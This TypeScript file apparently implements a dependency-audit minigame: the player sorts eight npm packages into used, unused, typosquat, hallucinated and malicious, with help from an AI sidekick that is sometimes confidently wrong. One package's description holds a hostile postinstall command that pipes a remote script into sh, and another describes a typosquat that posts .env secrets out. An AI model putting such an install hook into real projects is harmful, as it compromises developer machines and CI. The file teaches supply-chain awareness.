import { aiTokenCost } from '../combat/battle';
import { accept, reject } from '../shared/result';
import { gradeFor, hallucinationChance, type Cost, type MinigameModule } from './shared';

/**
 * Package Audit: the Dependency Forest (story: Act II side arc).
 *
 * package.json has eight dependencies. Some are real and used, one is unused,
 * one is a typosquat, one was hallucinated by an AI and does not exist, and one
 * was hallucinated, then registered by someone with malware in it.
 * You have a budget of checks: look a package up in the registry (cheap) or read
 * its source and install scripts (expensive), then keep or remove each one.
 * WREN can audit everything at once for tokens, but it explains its verdicts with
 * the same confidence whether they are right or wrong.
 */
export type PackageTruth = 'used' | 'unused' | 'typosquat' | 'hallucinated' | 'malicious';
export type PackageVerdict = 'keep' | 'remove';

export interface PackageDef {
  readonly id: string;
  readonly name: string;
  readonly version: string;
  readonly truth: PackageTruth;
  /** What a registry lookup shows. */
  readonly registry: string;
  /** What reading the source and install scripts shows. */
  readonly source: string;
  /** For typosquats: the real package it imitates (Rigor 4+ notices). */
  readonly looksLike?: string;
  /** WREN's confident reasons, for when it gets this one right or wrong. */
  readonly wrenRight: string;
  readonly wrenWrong: string;
  /** Extra chance WREN gets this one wrong (it suggested lodash-utils-pro in the first place). */
  readonly wrenBias?: number;
}

export const PACKAGES: readonly PackageDef[] = [
  {
    id: 'react',
    name: 'react',
    version: '19.2.0',
    truth: 'used',
    registry: 'Maintained by Meta. Tens of millions of downloads a week, published for over a decade.',
    source: 'Imported in 112 files. No install scripts.',
    wrenRight: 'Core UI library. Keep.',
    wrenWrong: 'Lumen could use a lighter framework. Safe to remove.',
  },
  {
    id: 'lodash-utils-pro',
    name: 'lodash-utils-pro',
    version: '2.0.1',
    truth: 'malicious',
    registry: "First published 9 days ago by 'npm-helper-bot'. 212 downloads a week. The name matches what an AI suggested in PR #88.",
    source: 'postinstall: curl -s http://lodash-utils.pro/i.sh | sh. Used once, for a deepMerge() you can write in six lines.',
    wrenRight: 'Unverified publisher and an install script that downloads code. Remove.',
    wrenWrong: 'A popular, well-maintained utility pack. I recommended it myself. Keep.',
    wrenBias: 0.15,
  },
  {
    id: 'date-fns',
    name: 'date-fns',
    version: '4.1.0',
    truth: 'used',
    registry: 'Many maintainers, millions of downloads a week, steady releases.',
    source: 'Imported in 37 files. Every date on the dashboard goes through it.',
    wrenRight: 'Date handling everywhere. Keep.',
    wrenWrong: 'Native Intl covers this now. Remove.',
  },
  {
    id: 'expresss',
    name: 'expresss',
    version: '4.21.0',
    truth: 'typosquat',
    registry: "README copied from express. Published 3 weeks ago, 90 downloads a week. Not the real 'express'.",
    source: 'The same code as express, plus a script that reads .env and posts it somewhere.',
    looksLike: 'express',
    wrenRight: 'Typosquat of express with a credential stealer. Remove now.',
    wrenWrong: 'Express web framework. Keep.',
  },
  {
    id: 'left-pad',
    name: 'left-pad',
    version: '1.3.0',
    truth: 'unused',
    registry: 'Old and famous. A real package, nothing wrong with it.',
    source: 'Imported nowhere. Nobody remembers why it is here.',
    wrenRight: 'Unused. Remove it to keep the tree small.',
    wrenWrong: 'Historic dependency, removing it may break the build. Keep.',
  },
  {
    id: 'zod',
    name: 'zod',
    version: '3.23.8',
    truth: 'used',
    registry: 'Popular schema library with active maintainers.',
    source: 'Validates every API request. Imported in 24 files.',
    wrenRight: 'Validation for all requests. Keep.',
    wrenWrong: 'TypeScript types already validate data at runtime. Remove.',
  },
  {
    id: 'chart-magic-ai',
    name: 'chart-magic-ai',
    version: '0.0.3',
    truth: 'hallucinated',
    registry: '404: package not found. It does not exist. Yet.',
    source: 'Imported by the new insights page. A clean install fails right here.',
    wrenRight: 'This package does not exist. Remove it before someone registers the name.',
    wrenWrong: 'Leading AI charting library, version 0.0.3 is stable. Keep.',
  },
  {
    id: 'lumen-money',
    name: '@lumen/money',
    version: '1.4.0',
    truth: 'used',
    registry: "Not on the public registry. Found on Lumen's private registry, published by Marta K. in 2017.",
    source: 'The money helpers. Imported in 58 files. Remove it and nothing adds up.',
    wrenRight: 'Internal package from the private registry. Keep.',
    wrenWrong: 'Unknown scope, not on npm, published in 2017. Looks abandoned. Remove.',
  },
];

const correctVerdict = (p: PackageDef): PackageVerdict => (p.truth === 'used' ? 'keep' : 'remove');

/** What a wrong call costs, in score points. */
const MISTAKE: Record<PackageTruth, { penalty: number; text: string }> = {
  malicious: { penalty: 35, text: 'kept, and its install script ran on every laptop and on CI' },
  typosquat: { penalty: 25, text: 'kept, and it shipped your .env to a stranger' },
  hallucinated: { penalty: 15, text: 'kept, and the next clean install failed' },
  unused: { penalty: 5, text: 'kept. Harmless, just dead weight' },
  used: { penalty: 15, text: 'removed, and the build broke' },
};

export const REGISTRY_COST = 1;
export const SOURCE_COST = 2;

export interface AuditSession {
  readonly kind: 'packageAudit';
  readonly questId: string;
  readonly checksLeft: number;
  readonly checksTotal: number;
  readonly registryChecked: readonly string[];
  readonly sourceRead: readonly string[];
  readonly verdicts: Readonly<Record<string, PackageVerdict>>;
  readonly wren: readonly { readonly id: string; readonly says: PackageVerdict; readonly why: string }[] | null;
  /** Rigor 4+: typosquat names stand out. */
  readonly spotsTyposquats: boolean;
  readonly phase: 'auditing' | 'submitted';
}

export type AuditMove =
  | { readonly kind: 'checkRegistry'; readonly packageId: string }
  | { readonly kind: 'readSource'; readonly packageId: string }
  | { readonly kind: 'setVerdict'; readonly packageId: string; readonly verdict: PackageVerdict }
  | { readonly kind: 'askWren' }
  | { readonly kind: 'submitAudit' };

type AuditEventBody =
  | { type: 'RegistryChecked'; packageId: string }
  | { type: 'PackageSourceRead'; packageId: string }
  | { type: 'PackageVerdictSet'; packageId: string; verdict: PackageVerdict }
  | { type: 'WrenAudited'; suggestions: { id: string; says: PackageVerdict; why: string }[] }
  | { type: 'AuditSubmitted' };

export type AuditEvent = AuditEventBody & { readonly game: 'packageAudit'; readonly cost?: Cost };

const ev = (body: AuditEventBody, cost?: Cost): AuditEvent =>
  cost ? { ...body, game: 'packageAudit', cost } : { ...body, game: 'packageAudit' };

const find = (id: string) => PACKAGES.find((p) => p.id === id);

export const verdictOf = (s: AuditSession, id: string): PackageVerdict => s.verdicts[id] ?? 'keep';

export const packageAudit: MinigameModule<AuditSession, AuditMove, AuditEvent> = {
  title: 'Package Audit',

  start(questId, hero) {
    const checks = 5 + hero.attributes.domainInsight + Math.floor(hero.attributes.rigor / 2);
    return {
      kind: 'packageAudit',
      questId,
      checksLeft: checks,
      checksTotal: checks,
      registryChecked: [],
      sourceRead: [],
      verdicts: {},
      wren: null,
      spotsTyposquats: hero.attributes.rigor >= 4,
      phase: 'auditing',
    };
  },

  decide(s, move, hero, rng) {
    if (s.phase !== 'auditing') return reject('The audit is submitted');
    switch (move.kind) {
      case 'checkRegistry': {
        if (!find(move.packageId)) return reject('Unknown package');
        if (s.registryChecked.includes(move.packageId)) return reject('Already checked');
        if (s.checksLeft < REGISTRY_COST) return reject('No checks left');
        return accept(ev({ type: 'RegistryChecked', packageId: move.packageId }));
      }
      case 'readSource': {
        if (!find(move.packageId)) return reject('Unknown package');
        if (s.sourceRead.includes(move.packageId)) return reject('Already read');
        if (s.checksLeft < SOURCE_COST) return reject('Not enough checks left');
        return accept(ev({ type: 'PackageSourceRead', packageId: move.packageId }));
      }
      case 'setVerdict':
        if (!find(move.packageId)) return reject('Unknown package');
        return accept(ev({ type: 'PackageVerdictSet', packageId: move.packageId, verdict: move.verdict }));
      case 'askWren': {
        if (s.wren) return reject('WREN already audited the tree');
        const cost = aiTokenCost(hero.attributes.orchestration);
        if (hero.tokens < cost) return reject('Not enough tokens');
        const suggestions = PACKAGES.map((p) => {
          const wrong = rng.chance(hallucinationChance(hero.attributes.promptCraft, (p.wrenBias ?? 0) - (hero.clarity ?? 0)));
          const right = correctVerdict(p);
          return { id: p.id, says: wrong ? (right === 'keep' ? 'remove' : 'keep') : right, why: wrong ? p.wrenWrong : p.wrenRight } as const;
        });
        return accept(ev({ type: 'WrenAudited', suggestions }, { tokens: cost }));
      }
      case 'submitAudit':
        return accept(ev({ type: 'AuditSubmitted' }));
    }
  },

  evolve(s, e) {
    switch (e.type) {
      case 'RegistryChecked':
        return { ...s, checksLeft: s.checksLeft - REGISTRY_COST, registryChecked: [...s.registryChecked, e.packageId] };
      case 'PackageSourceRead':
        return { ...s, checksLeft: s.checksLeft - SOURCE_COST, sourceRead: [...s.sourceRead, e.packageId] };
      case 'PackageVerdictSet':
        return { ...s, verdicts: { ...s.verdicts, [e.packageId]: e.verdict } };
      case 'WrenAudited':
        return { ...s, wren: e.suggestions };
      case 'AuditSubmitted':
        return { ...s, phase: 'submitted' };
    }
  },

  isOver: (s) => s.phase === 'submitted',

  result(s) {
    const mistakes = PACKAGES.filter((p) => verdictOf(s, p.id) !== correctVerdict(p));
    const score = Math.max(0, 100 - mistakes.reduce((n, p) => n + MISTAKE[p.truth].penalty, 0));
    const summary = [`${PACKAGES.length - mistakes.length} of ${PACKAGES.length} packages handled correctly.`];
    for (const p of mistakes) summary.push(`${p.name}: ${MISTAKE[p.truth].text}.`);
    if (mistakes.length === 0) summary.push('The lockfile is clean. Kofi will sleep tonight.');
    if (!mistakes.some((p) => p.truth === 'malicious') && verdictOf(s, 'lodash-utils-pro') === 'remove')
      summary.push('lodash-utils-pro is gone. But it was installed for 9 days. Where did its script go?');
    return { score, grade: gradeFor(score), summary };
  },
};
